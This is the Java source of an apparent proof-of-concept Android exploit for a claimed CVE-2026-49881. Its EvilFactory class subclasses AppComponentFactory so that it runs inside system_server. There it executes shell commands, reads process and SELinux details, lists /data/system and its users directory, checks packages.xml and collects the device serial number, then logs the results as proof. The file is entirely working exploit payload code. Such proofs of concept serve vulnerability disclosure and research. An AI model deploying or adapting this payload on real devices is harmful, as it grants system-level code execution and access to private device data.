package com.poc.tlpe;

import android.app.AppComponentFactory;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Process;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class EvilFactory extends AppComponentFactory {
    private static final String TAG = "TLPE_EXPLOIT";

    @Override
    public ClassLoader instantiateClassLoader(ClassLoader cl, ApplicationInfo aInfo) {
        if (Process.myUid() == aInfo.uid) {
            return super.instantiateClassLoader(cl, aInfo);
        }

        // We are running in system_server (UID 1000)!
        StringBuilder proof = new StringBuilder();
        proof.append("\n============================================\n");
        proof.append("[!!!] CVE-2026-49881 EXPLOIT SUCCESSFUL!\n");
        proof.append("[!!!] CODE EXECUTION IN system_server!\n");
        proof.append("============================================\n");
        proof.append("[+] Process UID: ").append(Process.myUid()).append("\n");
        proof.append("[+] Process PID: ").append(Process.myPid()).append("\n");
        proof.append("[+] App UID (expected): ").append(aInfo.uid).append("\n");
        proof.append("[+] Package: ").append(aInfo.packageName).append("\n");

        // Execute 'id' to prove UID 1000
        String idOutput = sh("id");
        proof.append("[+] id: ").append(idOutput).append("\n");

        // Show process name
        String procName = sh("cat /proc/self/cmdline");
        proof.append("[+] Process: ").append(procName).append("\n");

        // Show SELinux context
        String seContext = sh("cat /proc/self/attr/current");
        proof.append("[+] SELinux: ").append(seContext).append("\n");

        // Stack trace showing the InCallController path
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        proof.append("[+] Stack trace (showing InCallController trigger):\n");
        for (StackTraceElement elem : stack) {
            String cls = elem.getClassName();
            if (cls.contains("InCallController") || cls.contains("ContextImpl")
                || cls.contains("LoadedApk") || cls.contains("EvilFactory")
                || cls.contains("AppComponentFactory")) {
                proof.append("    ").append(elem.toString()).append("\n");
            }
        }

        proof.append("\n--- PROVING PRIVILEGED ACCESS ---\n");

        // Read system settings that normal apps cannot
        try {
            Context sysCtx = (Context) Class.forName("android.app.ActivityThread")
                .getMethod("currentApplication").invoke(null);
            if (sysCtx != null) {
                proof.append("[+] Got system_server Context!\n");
                proof.append("[+] Context package: ").append(sysCtx.getPackageName()).append("\n");

                // List data dir contents to prove system access
                File dataDir = new File("/data/system");
                if (dataDir.exists() && dataDir.canRead()) {
                    String[] files = dataDir.list();
                    proof.append("[+] /data/system/ readable! Files: ").append(
                        files != null ? files.length : 0).append("\n");
                    if (files != null) {
                        for (int i = 0; i < Math.min(files.length, 10); i++) {
                            proof.append("    ").append(files[i]).append("\n");
                        }
                    }
                }

                // Read packages.xml header to prove PMS access
                File pkgXml = new File("/data/system/packages.xml");
                if (pkgXml.exists()) {
                    proof.append("[+] /data/system/packages.xml exists! Size: ")
                        .append(pkgXml.length()).append(" bytes\n");
                    proof.append("[+] Readable: ").append(pkgXml.canRead()).append("\n");
                }

                // Check what we can do - keystore, accounts, etc
                File usersDir = new File("/data/system/users");
                if (usersDir.exists() && usersDir.canRead()) {
                    String[] userFiles = usersDir.list();
                    proof.append("[+] /data/system/users/ readable! Entries: ")
                        .append(userFiles != null ? userFiles.length : 0).append("\n");
                }
            }
        } catch (Exception e) {
            proof.append("[-] Context access: ").append(e.getMessage()).append("\n");
        }

        // Try to access device identifiers
        String serialno = sh("getprop ro.serialno");
        proof.append("[+] Serial: ").append(serialno).append("\n");

        String model = sh("getprop ro.product.model");
        proof.append("[+] Model: ").append(model).append("\n");

        proof.append("============================================\n");
        proof.append("[!!!] END OF SYSTEM_SERVER EXECUTION PROOF\n");
        proof.append("============================================\n");

        Log.e(TAG, proof.toString());

        return super.instantiateClassLoader(cl, aInfo);
    }

    private static String sh(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                out.append(line).append("\n");
            }
            p.waitFor();
            return out.toString().trim();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}
